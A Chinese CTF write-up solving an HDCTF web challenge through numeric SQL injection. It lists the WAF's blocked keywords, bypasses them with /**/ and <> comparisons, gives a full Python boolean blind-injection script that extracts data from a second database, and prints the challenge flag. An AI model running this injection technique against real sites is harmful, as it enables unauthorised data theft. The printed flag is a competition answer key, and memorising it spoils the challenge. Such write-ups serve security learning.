---
title: "息壤样本档案管理系统：数字型 SQL 注入"
date: "2026-09-12"
categories: "Web"
tags: ["SQL 注入", "布尔盲注", "过滤绕过"]
excerpt: "以注释替代空白绕过数字型 SQL 注入过滤，通过布尔盲注定位另一个数据库中的真实记录。"
slug: "hdctf-wuling-sql-injection"
source_event: "HDCTF"
---

> 复现材料：`题目 HTTP 服务`。赛题附件未随文章打包。本文日期取自原始题解文件的修改日期。 认证材料及其编码值已改为环境变量，复现时从自己的赛题环境注入。

查询入口收归管理员专用后加了新过滤，flag 藏在数据库里。目标是把 `/search.php` 的 `id` 参数打成布尔盲注，把数据带出来。

## 入口

`robots.txt` 里留了注释：

```
# legacy-manager-key: $CTF_LEGACY_KEY_B64
```

历史认证线索的原值已移除；复现时通过 `CTF_USERNAME`、`CTF_PASSWORD` 注入自己赛题环境的账号口令。登录后进入 `/query.php`，查询表单 POST 到 `/search.php`。

## 漏洞点

`id=1` 正常返回，`id=1'` 报"查询失败"，`id=1+1` 返回的是 id=2 的行。`id` 被无引号拼进 `WHERE id = $id`，是数字型注入。

新查询规则实测：

| 输入 | 结果 |
|---|---|
| `1+1` | 返回 id=2，SQL 里算了算术 |
| `1 or 1`、`1and1` | 访问被拒绝 |
| `union`、`sleep`、`benchmark`、`=` | 访问被拒绝 |
| `(select/**/1)` | 返回 id=1，`/**/` 能当空格用 |
| `(select/**/999)` | 空表，没有 id=999 |

规则是任何空白字符直接拒，`union/and/sleep/benchmark/=` 进黑名单；`or`、`select`、`ascii`、`mid`、`limit`、hex 字面量都放行。所以空格全用 `/**/` 替代，比较只用 `>`、`<>`、`like`，字符串写 `0x...`。`id=(<条件>)` 为真返回 id=1，为假返回空表，这就是布尔盲注 oracle。

## 盲注结果

按字节二分 `ascii(mid(str,pos,1))>mid` 逐字符读：

- 当前库 `wuling`：表 `sample_ledger`、`seed_vault`、`transfer_log`
- `seed_vault.token` = `flag{fake_flag}`，是诱饵
- `transfer_log` 里只有几条调拨记录，全是烟幕
- 另一个库 `guizang`：表 `abyss_core(idx, mark, token)` 两行，第 2 行 `mark='signal-core'`，`token` 就是真 flag

## 解题脚本

```python
import http.cookiejar
import os
import urllib.parse
import urllib.request

BASE = os.environ["CTF_BASE_URL"].rstrip("/")

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def post(path, data):
    req = urllib.request.Request(BASE + path, data=urllib.parse.urlencode(data).encode())
    return opener.open(req, timeout=10).read().decode('utf-8', 'replace')

def oracle(expr):
    # expr: SQL 布尔表达式，空白用 /**/，不能出现 '='
    body = post('/search.php', {'id': '(' + expr + ')'})
    return '<td>1</td>' in body

def read_int(expr):
    # 二分找 expr > mid 的最大 mid，值 = mid + 1
    if not oracle(f'({expr}>0)'):
        return 0
    lo, hi = 0, 256
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f'({expr}>{mid})'):
            lo = mid
        else:
            hi = mid - 1
    return lo + 1

def read_str(expr):
    length = read_int(f'length({expr})')
    return ''.join(chr(read_int(f'ascii(mid({expr},{i},1))')) for i in range(1, length + 1))

post("/", {"username": os.environ["CTF_USERNAME"], "password": os.environ["CTF_PASSWORD"]})

expr = '(select/**/token/**/from/**/guizang.abyss_core/**/order/**/by/**/idx/**/limit/**/1,1)'
print(read_str(expr))
```

## Flag

```text
HDCTF{5b7849be-0a2e-7f76-de86-570d6be324fe}
```

根因一句话：`id` 无引号拼进 SQL，WAF 只查字面关键字和空白，`/**/` 加 `<>` 就绕过去了；真 flag 在第二个库 `guizang.abyss_core`，`seed_vault` 里的 `flag{fake_flag}` 是故意放的诱饵。
